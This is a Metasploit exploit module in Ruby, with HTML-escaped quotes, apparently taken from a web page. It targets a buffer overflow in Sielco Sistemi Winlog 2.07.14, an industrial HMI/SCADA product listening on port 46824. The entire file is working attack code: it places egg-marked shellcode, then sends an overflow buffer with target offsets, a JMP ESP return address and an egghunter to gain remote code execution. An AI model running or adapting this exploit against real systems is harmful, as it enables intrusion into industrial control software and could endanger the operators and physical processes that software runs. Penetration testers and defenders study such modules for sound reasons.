
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Remote::Egghunter
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;         => &#039;Sielco Sistemi Winlog Buffer Overflow 2.07.14&#039;,
            &#039;Description&#039;  => %q{
                This module exploits a buffer overflow in Sielco Sistem Winlog <= 2.07.14.
                When sending a specially formatted packet to the Runtime.exe service on port 46824,
                an attacker may be able to execute arbitrary code.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;m-1-k-3 <m1k3[at]s3cur1ty.de>&#039;
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;BID&#039;, &#039;53811&#039;],
                    [ &#039;URL&#039;, &#039;http://www.s3cur1ty.de&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.sielcosistemi.com/en/download/public/winlog_lite.html&#039; ]
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;ExitFunction&#039; => &#039;process&#039;,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 2000,
                    &#039;BadChars&#039; => "\x00",
                    &#039;DisableNops&#039; => true,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Sielco Sistemi Winlog 2.07.14 - Ceramics Kiln Project&#039;,
                        {
                            &#039;Ret&#039;    => 0x405153df,
                            &#039;Offset&#039; => 167,
                        }
                    ], #  Jmp ESP - Vclx40.bpl - 0x405153df
                    [ &#039;Sielco Sistemi Winlog 2.07.14 - Automatic Washing System Project&#039;,
                        {
                            &#039;Ret&#039;    => 0x405153df,
                            &#039;Offset&#039; => 151,
                        }
                    ], #  Jmp ESP - Vclx40.bpl - 0x405153df
                    #The reliability depends on the actual project. We need to generate some more
                    #targets. Two of them for the default project and one other project is now available.
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Jun 04 2012&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options([Opt::RPORT(46824)], self.class)
    end
 
    def exploit
        connect
 
        egghunter,egg = generate_egghunter(payload.encoded, payload_badchars)
 
        print_status("Placing the shellcode")
        shellcode = rand_text_alpha(2000)
        shellcode << egg
        sock.put(shellcode)
 
        select(nil,nil,nil,1)
 
        buffer = rand_text_alpha(20)
        buffer << "\x14" * 10     #trigger the crash
        buffer << rand_text_alpha(target[&#039;Offset&#039;])
        buffer << [target.ret].pack(&#039;V&#039;)
        buffer << egghunter
        buffer << rand_text_alpha(69 - egghunter.length)
 
        print_status("Trying target #{target.name}...")
        sock.put(buffer)
 
        handler
        disconnect
 
    end
end



